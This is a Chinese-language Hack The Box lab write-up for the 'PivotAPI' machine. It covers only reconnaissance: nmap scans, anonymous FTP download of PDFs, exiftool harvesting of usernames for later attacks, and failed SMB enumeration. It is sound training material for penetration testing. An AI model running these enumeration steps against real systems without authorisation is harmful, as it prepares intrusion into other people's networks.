---
title: HTB-PivotAPI Writeup
date: 2026-04-13T17:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - HTB
  - Writeup
  - Windows
  - FTP
  - SMB
  - RPC
  - GetNPUsers
  - BloodHound
  - 逆向
  - MSSQL
---
## 初始侦察

### Nmap 端口扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ sudo nmap --min-rate 10000 -p- 10.129.228.115 -oA Nmapscan/ports
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 04:38 -0400
Nmap scan report for 10.129.228.115
Host is up (0.26s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
9389/tcp  open  adws
49668/tcp open  unknown
49677/tcp open  unknown
49678/tcp open  unknown
49695/tcp open  unknown
49709/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 38.08 seconds
```

提取端口备用。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ grep open Nmapscan/ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
21,22,53,88,135,139,389,445,464,593,636,1433,3268,3269,9389,49668,49677,49678,49695,49709

```

### Nmap 详细信息扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ sudo nmap -sT -sC -sV -O -p21,22,53,88,135,139,389,445,464,593,636,1433,3268,3269,9389,49668,49677,49678,49695,49709 10.129.228.115 -oA Nmapscan/detail
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 04:54 -0400
Stats: 0:00:57 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 80.00% done; ETC: 04:55 (0:00:14 remaining)
Nmap scan report for 10.129.228.115
Host is up (0.15s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-19-21  03:06PM               103106 10.1.1.414.6453.pdf
| 02-19-21  03:06PM               656029 28475-linux-stack-based-buffer-overflows.pdf
| 02-19-21  12:55PM              1802642 BHUSA09-McDonald-WindowsHeap-PAPER.pdf
| 02-19-21  03:06PM              1018160 ExploitingSoftware-Ch07.pdf
| 08-08-20  01:18PM               219091 notes1.pdf
| 08-08-20  01:34PM               279445 notes2.pdf
| 08-08-20  01:41PM                  105 README.txt
|_02-19-21  03:06PM              1301120 RHUL-MA-2009-06.pdf
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   3072 fa:19:bb:8d:b6:b6:fb:97:7e:17:80:f5:df:fd:7f:d2 (RSA)
|   256 44:d0:8b:cc:0a:4e:cd:2b:de:e8:3a:6e:ae:65:dc:10 (ECDSA)
|_  256 93:bd:b6:e2:36:ce:72:45:6c:1d:46:60:dd:08:6a:44 (ED25519)
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-06 08:54:26Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: LicorDeBellota.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.228.115:1433: 
|     Target_Name: LICORDEBELLOTA
|     NetBIOS_Domain_Name: LICORDEBELLOTA
|     NetBIOS_Computer_Name: PIVOTAPI
|     DNS_Domain_Name: LicorDeBellota.htb
|     DNS_Computer_Name: PivotAPI.LicorDeBellota.htb
|     DNS_Tree_Name: LicorDeBellota.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.228.115:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-04-06T08:54:53
|_Not valid after:  2056-04-06T08:54:53
|_ssl-date: 2026-04-06T08:56:00+00:00; -1s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: LicorDeBellota.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: PIVOTAPI; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-04-06T08:55:21
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.42 seconds
```

- 开放 ftp-21 服务，可以使用 `anonymous` 登入访问
- 开放 LDAP 389/3268 服务
- 开放 smb-445 服务
- 暴露主机名为 `LicorDeBellota.htb`、域名为 `LicorDeBellota.htb`、NetBIOS 名为 `PIVOTAPI`

综上，开放的靶机是一个域控制器。

### Nmap 默认脚本扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ sudo nmap --script=vuln -p 21,22,53,88,135,139,389,445,464,593,636,1433,3268,3269,9389,49668,49677,49678,49695,49709 10.129.228.115 -oA Nmapscan/script
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 04:54 -0400
Nmap scan report for 10.129.228.115
Host is up (0.16s latency).

PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
|_ssl-ccs-injection: No reply from server (TIMEOUT)
1433/tcp  open  ms-sql-s
|_tls-ticketbleed: ERROR: Script execution failed (use -d to debug)
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
|_ssl-ccs-injection: No reply from server (TIMEOUT)
9389/tcp  open  adws
49668/tcp open  unknown
49677/tcp open  unknown
49678/tcp open  unknown
49695/tcp open  unknown
49709/tcp open  unknown

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR

Nmap done: 1 IP address (1 host up) scanned in 109.78 seconds

```

将暴露出来的域名添加进 `hosts`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ sudo bash -c 'echo "10.129.228.115 LicorDeBellota.htb PivotAPI.LicorDeBellota.htb" >> /etc/hosts'
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ tail -n 1 /etc/hosts
10.129.228.115 LicorDeBellota.htb

```

## FTP 渗透

Nmap 扫描暴露出有 FTP 服务且可以匿名登入，尝试登入下载其中的文件。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ ftp LicorDeBellota.htb            
Connected to LicorDeBellota.htb.
220 Microsoft FTP Service
Name (LicorDeBellota.htb:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||56122|)
125 Data connection already open; Transfer starting.
02-19-21  03:06PM               103106 10.1.1.414.6453.pdf
02-19-21  03:06PM               656029 28475-linux-stack-based-buffer-overflows.pdf
02-19-21  12:55PM              1802642 BHUSA09-McDonald-WindowsHeap-PAPER.pdf
02-19-21  03:06PM              1018160 ExploitingSoftware-Ch07.pdf
08-08-20  01:18PM               219091 notes1.pdf
08-08-20  01:34PM               279445 notes2.pdf
08-08-20  01:41PM                  105 README.txt
02-19-21  03:06PM              1301120 RHUL-MA-2009-06.pdf
226 Transfer complete.
ftp> binary
200 Type set to I.
ftp> mget *.pdf
mget 10.1.1.414.6453.pdf [anpqy?]? 
229 Entering Extended Passive Mode (|||56148|)
150 Opening BINARY mode data connection.
100% |****************************************************************************************************************************************************************************************************************|   100 KiB   22.83 KiB/s    00:00 ETA
226 Transfer complete.
103106 bytes received in 00:04 (22.49 KiB/s)
mget 28475-linux-stack-based-buffer-overflows.pdf [anpqy?]? 
229 Entering Extended Passive Mode (|||56149|)
125 Data connection already open; Transfer starting.
100% |****************************************************************************************************************************************************************************************************************|   640 KiB  261.32 KiB/s    00:00 ETA
226 Transfer complete.
656029 bytes received in 00:02 (261.25 KiB/s)
mget BHUSA09-McDonald-WindowsHeap-PAPER.pdf [anpqy?]? 
229 Entering Extended Passive Mode (|||56150|)
125 Data connection already open; Transfer starting.
100% |****************************************************************************************************************************************************************************************************************|  1760 KiB  436.17 KiB/s    00:00 ETA
226 Transfer complete.
1802642 bytes received in 00:04 (436.12 KiB/s)
mget ExploitingSoftware-Ch07.pdf [anpqy?]? 
229 Entering Extended Passive Mode (|||56151|)
150 Opening BINARY mode data connection.
100% |****************************************************************************************************************************************************************************************************************|   994 KiB  542.60 KiB/s    00:00 ETA
226 Transfer complete.
1018160 bytes received in 00:01 (542.56 KiB/s)
mget notes1.pdf [anpqy?]? 
229 Entering Extended Passive Mode (|||56163|)
150 Opening BINARY mode data connection.
100% |****************************************************************************************************************************************************************************************************************|   213 KiB  272.13 KiB/s    00:00 ETA
226 Transfer complete.
219091 bytes received in 00:00 (272.08 KiB/s)
mget notes2.pdf [anpqy?]? 
229 Entering Extended Passive Mode (|||56164|)
125 Data connection already open; Transfer starting.
100% |****************************************************************************************************************************************************************************************************************|   272 KiB  209.41 KiB/s    00:00 ETA
226 Transfer complete.
279445 bytes received in 00:01 (209.38 KiB/s)
mget RHUL-MA-2009-06.pdf [anpqy?]? 
229 Entering Extended Passive Mode (|||56165|)
150 Opening BINARY mode data connection.
100% |****************************************************************************************************************************************************************************************************************|  1270 KiB  567.34 KiB/s    00:00 ETA
226 Transfer complete.
1301120 bytes received in 00:02 (567.32 KiB/s)
ftp> 
ftp> dir
229 Entering Extended Passive Mode (|||56171|)
125 Data connection already open; Transfer starting.
02-19-21  03:06PM               103106 10.1.1.414.6453.pdf
02-19-21  03:06PM               656029 28475-linux-stack-based-buffer-overflows.pdf
02-19-21  12:55PM              1802642 BHUSA09-McDonald-WindowsHeap-PAPER.pdf
02-19-21  03:06PM              1018160 ExploitingSoftware-Ch07.pdf
08-08-20  01:18PM               219091 notes1.pdf
08-08-20  01:34PM               279445 notes2.pdf
08-08-20  01:41PM                  105 README.txt
02-19-21  03:06PM              1301120 RHUL-MA-2009-06.pdf
226 Transfer complete.
ftp> mget README.txt                                                                                                                                                                                                                                         
mget README.txt [anpqy?]? 
229 Entering Extended Passive Mode (|||56181|)
125 Data connection already open; Transfer starting.
100% |****************************************************************************************************************************************************************************************************************|   105        0.67 KiB/s    00:00 ETA
226 Transfer complete.
105 bytes received in 00:00 (0.66 KiB/s)
```

下载出七个 PDF 以及一个 README 文件。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI]
└─$ ls -liah                
total 5.2M
2784934 drwxrwxr-x 3 kali kali 4.0K Apr  6 05:16 .
2759041 drwxrwxr-x 5 kali kali 4.0K Apr  6 03:57 ..
2784987 -rw-rw-r-- 1 kali kali 101K Feb 19  2021 10.1.1.414.6453.pdf
2784988 -rw-rw-r-- 1 kali kali 641K Feb 19  2021 28475-linux-stack-based-buffer-overflows.pdf
2784989 -rw-rw-r-- 1 kali kali 1.8M Feb 19  2021 BHUSA09-McDonald-WindowsHeap-PAPER.pdf
2784990 -rw-rw-r-- 1 kali kali 995K Feb 19  2021 ExploitingSoftware-Ch07.pdf
2784974 drwxrwxr-x 2 kali kali 4.0K Apr  6 04:54 Nmapscan
2784991 -rw-rw-r-- 1 kali kali 214K Aug  8  2020 notes1.pdf
2784992 -rw-rw-r-- 1 kali kali 273K Aug  8  2020 notes2.pdf
2784994 -rw-rw-r-- 1 kali kali  105 Aug  8  2020 README.txt
2784993 -rw-rw-r-- 1 kali kali 1.3M Feb 19  2021 RHUL-MA-2009-06.pdf

```

也可以用 wget 进行下载。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/test]
└─$ wget -m ftp://anonymous:Enil@LicorDeBellota.htb                                                         
--2026-04-06 05:18:34--  ftp://anonymous:*password*@licordebellota.htb/
           => ‘licordebellota.htb/.listing’
Resolving licordebellota.htb (licordebellota.htb)... 10.129.228.115
Connecting to licordebellota.htb (licordebellota.htb)|10.129.228.115|:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... done.    ==> LIST ... done.

licordebellota.htb/.listing                                         [ <=>                                                                                                                                                 ]     505  --.-KB/s    in 0s      

==> PASV ... done.    ==> LIST ... done.

licordebellota.htb/.listing                                         [ <=>                                                                                                                                                 ]     505  --.-KB/s    in 0s      

2026-04-06 05:18:36 (254 MB/s) - ‘licordebellota.htb/.listing’ saved [1010]

--2026-04-06 05:18:36--  ftp://anonymous:*password*@licordebellota.htb/10.1.1.414.6453.pdf
           => ‘licordebellota.htb/10.1.1.414.6453.pdf’
==> CWD not required.
==> PASV ... done.    ==> RETR 10.1.1.414.6453.pdf ... done.
Length: 103106 (101K)

licordebellota.htb/10.1.1.414.6453.pdf                          100%[====================================================================================================================================================>] 100.69K   221KB/s    in 0.5s    

2026-04-06 05:18:37 (221 KB/s) - ‘licordebellota.htb/10.1.1.414.6453.pdf’ saved [103106]

--2026-04-06 05:18:37--  ftp://anonymous:*password*@licordebellota.htb/28475-linux-stack-based-buffer-overflows.pdf
           => ‘licordebellota.htb/28475-linux-stack-based-buffer-overflows.pdf’
==> CWD not required.
==> PASV ... done.    ==> RETR 28475-linux-stack-based-buffer-overflows.pdf ... done.
Length: 656029 (641K)

licordebellota.htb/28475-linux-stack-based-buffer-overflows.pdf 100%[====================================================================================================================================================>] 640.65K   494KB/s    in 1.3s    

2026-04-06 05:18:39 (494 KB/s) - ‘licordebellota.htb/28475-linux-stack-based-buffer-overflows.pdf’ saved [656029]

--2026-04-06 05:18:39--  ftp://anonymous:*password*@licordebellota.htb/BHUSA09-McDonald-WindowsHeap-PAPER.pdf
           => ‘licordebellota.htb/BHUSA09-McDonald-WindowsHeap-PAPER.pdf’
==> CWD not required.
==> PASV ... done.    ==> RETR BHUSA09-McDonald-WindowsHeap-PAPER.pdf ... done.
Length: 1802642 (1.7M)

licordebellota.htb/BHUSA09-McDonald-WindowsHeap-PAPER.pdf       100%[====================================================================================================================================================>]   1.72M   413KB/s    in 4.3s    

2026-04-06 05:18:46 (413 KB/s) - ‘licordebellota.htb/BHUSA09-McDonald-WindowsHeap-PAPER.pdf’ saved [1802642]

--2026-04-06 05:18:46--  ftp://anonymous:*password*@licordebellota.htb/ExploitingSoftware-Ch07.pdf
           => ‘licordebellota.htb/ExploitingSoftware-Ch07.pdf’
==> CWD not required.
==> PASV ... done.    ==> RETR ExploitingSoftware-Ch07.pdf ... done.
Length: 1018160 (994K)

licordebellota.htb/ExploitingSoftware-Ch07.pdf                  100%[====================================================================================================================================================>] 994.30K   617KB/s    in 1.6s    

2026-04-06 05:18:49 (617 KB/s) - ‘licordebellota.htb/ExploitingSoftware-Ch07.pdf’ saved [1018160]

--2026-04-06 05:18:49--  ftp://anonymous:*password*@licordebellota.htb/notes1.pdf
           => ‘licordebellota.htb/notes1.pdf’
==> CWD not required.
==> PASV ... done.    ==> RETR notes1.pdf ... done.
Length: 219091 (214K)

licordebellota.htb/notes1.pdf                                   100%[====================================================================================================================================================>] 213.96K   272KB/s    in 0.8s    

2026-04-06 05:18:52 (272 KB/s) - ‘licordebellota.htb/notes1.pdf’ saved [219091]

--2026-04-06 05:18:52--  ftp://anonymous:*password*@licordebellota.htb/notes2.pdf
           => ‘licordebellota.htb/notes2.pdf’
==> CWD not required.
==> PASV ... done.    ==> RETR notes2.pdf ... done.
Length: 279445 (273K)

licordebellota.htb/notes2.pdf                                   100%[====================================================================================================================================================>] 272.90K   437KB/s    in 0.6s    

2026-04-06 05:18:54 (437 KB/s) - ‘licordebellota.htb/notes2.pdf’ saved [279445]

--2026-04-06 05:18:54--  ftp://anonymous:*password*@licordebellota.htb/README.txt
           => ‘licordebellota.htb/README.txt’
==> CWD not required.
==> PASV ... done.    ==> RETR README.txt ... done.
Length: 105

licordebellota.htb/README.txt                                   100%[====================================================================================================================================================>]     105  --.-KB/s    in 0s      

2026-04-06 05:18:57 (14.2 MB/s) - ‘licordebellota.htb/README.txt’ saved [105]

--2026-04-06 05:18:57--  ftp://anonymous:*password*@licordebellota.htb/RHUL-MA-2009-06.pdf
           => ‘licordebellota.htb/RHUL-MA-2009-06.pdf’
==> CWD not required.
==> PASV ... done.    ==> RETR RHUL-MA-2009-06.pdf ... done.
Length: 1301120 (1.2M)

licordebellota.htb/RHUL-MA-2009-06.pdf                          100%[====================================================================================================================================================>]   1.24M   628KB/s    in 2.0s    

2026-04-06 05:19:00 (628 KB/s) - ‘licordebellota.htb/RHUL-MA-2009-06.pdf’ saved [1301120]

FINISHED --2026-04-06 05:19:00--
Total wall clock time: 26s
Downloaded: 9 files, 5.1M in 11s (475 KB/s)
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/test]
└─$ cd licordebellota.htb 

┌──(kali㉿kali)-[~/…/Kali/PivotAPI/test/licordebellota.htb]
└─$ ls -liah
total 5.2M
2784996 drwxrwxr-x 2 kali kali 4.0K Apr  6 05:18 .
2784995 drwxrwxr-x 3 kali kali 4.0K Apr  6 05:18 ..
2784998 -rw-rw-r-- 1 kali kali 101K Feb 19  2021 10.1.1.414.6453.pdf
2784999 -rw-rw-r-- 1 kali kali 641K Feb 19  2021 28475-linux-stack-based-buffer-overflows.pdf
2785000 -rw-rw-r-- 1 kali kali 1.8M Feb 19  2021 BHUSA09-McDonald-WindowsHeap-PAPER.pdf
2785001 -rw-rw-r-- 1 kali kali 995K Feb 19  2021 ExploitingSoftware-Ch07.pdf
2784997 -rw-rw-r-- 1 kali kali  505 Apr  6 05:18 .listing
2785002 -rw-rw-r-- 1 kali kali 214K Aug  8  2020 notes1.pdf
2785003 -rw-rw-r-- 1 kali kali 273K Aug  8  2020 notes2.pdf
2785004 -rw-rw-r-- 1 kali kali  105 Aug  8  2020 README.txt
2785005 -rw-rw-r-- 1 kali kali 1.3M Feb 19  2021 RHUL-MA-2009-06.pdf
```

- -m（--mirror）：镜像模式，是下面选项的简写
	1. -N：仅下载比本地文件更新的文件
	2. -r：递归下载
	3. -l inf：无线递归
	4. --no-remove-listing：不删除 FTP 目录列表

查看 README，提示我们记得开 binary 模式下载文件，不然会损坏。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb]
└─$ batcat README.txt                                                                  
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: README.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ VERY IMPORTANT!!
   2   │ Don't forget to change the download mode to binary so that the files are not corrupted.
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 
```

查看 PDF 的具体信息，均为 PDF 文件。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb]
└─$ file 10.1.1.414.6453.pdf          
10.1.1.414.6453.pdf: PDF document, version 1.2, 6 page(s)
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb]
└─$ file *.pdf              
10.1.1.414.6453.pdf:                          PDF document, version 1.2, 6 page(s)
28475-linux-stack-based-buffer-overflows.pdf: PDF document, version 1.5, 20 page(s)
BHUSA09-McDonald-WindowsHeap-PAPER.pdf:       PDF document, version 1.4, 84 page(s)
ExploitingSoftware-Ch07.pdf:                  PDF document, version 1.3, 10 page(s)
notes1.pdf:                                   PDF document, version 1.5, 5 page(s)
notes2.pdf:                                   PDF document, version 1.5, 5 page(s)
RHUL-MA-2009-06.pdf:                          PDF document, version 1.4, 88 page(s)
```

用 exiftool 进一步分析。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb]
└─$ exiftool *.pdf                        
======== 10.1.1.414.6453.pdf
ExifTool Version Number         : 13.50
File Name                       : 10.1.1.414.6453.pdf
Directory                       : .
File Size                       : 103 kB
File Modification Date/Time     : 2021:02:19 15:06:00-05:00
File Access Date/Time           : 2026:04:06 05:26:06-04:00
File Inode Change Date/Time     : 2026:04:06 05:18:37-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.2
Linearized                      : No
Page Count                      : 23
Media Box                       : 0, 0, 595, 842
Creator                         : Microsoft Word
Create Date                     : 10. February 2000 11:41
Title                           : Takanen
Author                          : Unknown
Producer                        : Acrobat PDFWriter 3.02 for Windows
Subject                         : 
======== 28475-linux-stack-based-buffer-overflows.pdf
ExifTool Version Number         : 13.50
File Name                       : 28475-linux-stack-based-buffer-overflows.pdf
Directory                       : .
File Size                       : 656 kB
File Modification Date/Time     : 2021:02:19 15:06:00-05:00
File Access Date/Time           : 2026:04:06 05:26:18-04:00
File Inode Change Date/Time     : 2026:04:06 05:18:39-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 20
Language                        : en-US
Tagged PDF                      : Yes
Author                          : saif
Creator                         : Microsoft® Word 2013
Create Date                     : 2013:05:20 08:38:13+03:00
Modify Date                     : 2013:05:20 08:38:13+03:00
Producer                        : Microsoft® Word 2013
======== BHUSA09-McDonald-WindowsHeap-PAPER.pdf
ExifTool Version Number         : 13.50
File Name                       : BHUSA09-McDonald-WindowsHeap-PAPER.pdf
Directory                       : .
File Size                       : 1803 kB
File Modification Date/Time     : 2021:02:19 12:55:00-05:00
File Access Date/Time           : 2026:04:06 05:26:18-04:00
File Inode Change Date/Time     : 2026:04:06 05:18:46-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : Yes
XMP Toolkit                     : Adobe XMP Core 4.0-c316 44.253921, Sun Oct 01 2006 17:08:23
Format                          : application/pdf
Creator                         : byron gronseth
Title                           : Microsoft Word - BHUSA09-McDonald-WindowsHeap-PAPER.doc
Modify Date                     : 2009:07:26 16:39:11-07:00
Creator Tool                    : Microsoft Word: cgpdftops CUPS filter
Create Date                     : 2009:07:26 16:39:11-07:00
Producer                        : Acrobat Distiller 8.1.0 (Macintosh)
Document ID                     : uuid:fd77bd15-9bb2-f043-a044-c49fe4b31119
Instance ID                     : uuid:a8086d1b-7d63-9f41-955c-553c0b8b5cfb
Page Count                      : 84
Author                          : byron gronseth
======== ExploitingSoftware-Ch07.pdf
ExifTool Version Number         : 13.50
File Name                       : ExploitingSoftware-Ch07.pdf
Directory                       : .
File Size                       : 1018 kB
File Modification Date/Time     : 2021:02:19 15:06:00-05:00
File Access Date/Time           : 2026:04:06 05:26:18-04:00
File Inode Change Date/Time     : 2026:04:06 05:18:49-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.3
Linearized                      : No
Page Count                      : 90
Media Box                       : 0, 0, 576, 738
Create Date                     : 2004:01:30 14:27:37
Producer                        : Acrobat Distiller 4.05 for Macintosh
======== notes1.pdf
ExifTool Version Number         : 13.50
File Name                       : notes1.pdf
Directory                       : .
File Size                       : 219 kB
File Modification Date/Time     : 2020:08:08 13:18:00-04:00
File Access Date/Time           : 2026:04:06 05:26:18-04:00
File Inode Change Date/Time     : 2026:04:06 05:18:52-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 5
Creator                         : cairo 1.10.2 (http://cairographics.org)
Producer                        : cairo 1.10.2 (http://cairographics.org)
======== notes2.pdf
ExifTool Version Number         : 13.50
File Name                       : notes2.pdf
Directory                       : .
File Size                       : 279 kB
File Modification Date/Time     : 2020:08:08 13:34:00-04:00
File Access Date/Time           : 2026:04:06 05:26:18-04:00
File Inode Change Date/Time     : 2026:04:06 05:18:54-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 5
XMP Toolkit                     : Image::ExifTool 12.03
Creator                         : Kaorz
Publisher                       : LicorDeBellota.htb
Producer                        : cairo 1.10.2 (http://cairographics.org)
======== RHUL-MA-2009-06.pdf
ExifTool Version Number         : 13.50
File Name                       : RHUL-MA-2009-06.pdf
Directory                       : .
File Size                       : 1301 kB
File Modification Date/Time     : 2021:02:19 15:06:00-05:00
File Access Date/Time           : 2026:04:06 05:26:18-04:00
File Inode Change Date/Time     : 2026:04:06 05:19:00-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 88
XMP Toolkit                     : XMP toolkit 2.9.1-13, framework 1.6
About                           : 14ac9a6d-ff72-11dd-0000-8fdb8053d234
Producer                        : GPL Ghostscript 8.63
Modify Date                     : 2009:02:17 17:15:32Z00:00
Create Date                     : 2009:02:17 17:15:32Z00:00
Creator Tool                    : PScript5.dll Version 5.2.2
Document ID                     : 14ac9a6d-ff72-11dd-0000-8fdb8053d234
Format                          : application/pdf
Title                           : Microsoft Word - BufferOverflows_cover
Creator                         : alex
Author                          : alex
    7 image files read

```

一些 PDF 有创建者信息：`28475-linux-stack-based-buffer-overflows.pdf:saif`、`notes2.pdf:Kaorz`、`RHUL-MA-2009-06.pdf:alex`、`BHUSA09-McDonald-WindowsHeap-PAPER.pdf:byron gronseth`

其中 `notes2.pdf` 暴露出一个域名 `Publisher : LicorDeBellota.htb` 和一个软件版本 `Producer  : cairo 1.10.2`。

将发现的人名加入进 `users.txt` 做备用。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb]
└─$ vim users.txt           
                                                                                                                                                                                                                                                                                         
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb]
└─$ cat users.txt 
Kaorz
saif
alex
byron gronseth
```

## SMB 渗透

使用 smbmap 枚举机器。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb]
└─$ smbmap -H LicorDeBellota.htb  

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                      
[!] Access denied on 10.129.228.115, no fun for you...                                                                       
[*] Closed 1 connections 
```

无法成功连接。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb]
└─$ crackmapexec smb LicorDeBellota.htb
SMB         LicorDeBellota.htb 445    PIVOTAPI         [*] Windows 10 / Server 2019 Build 17763 x64 (name:PIVOTAPI) (domain:LicorDeBellota.htb) (signing:True) (SMBv1:False)

```

使用 crackmapexec 尝试枚举，开放 445 smb 服务，但是无法成功连接。

使用 smbclient 进行枚举。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb]
└─$ smbclient -L 10.129.228.115 -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
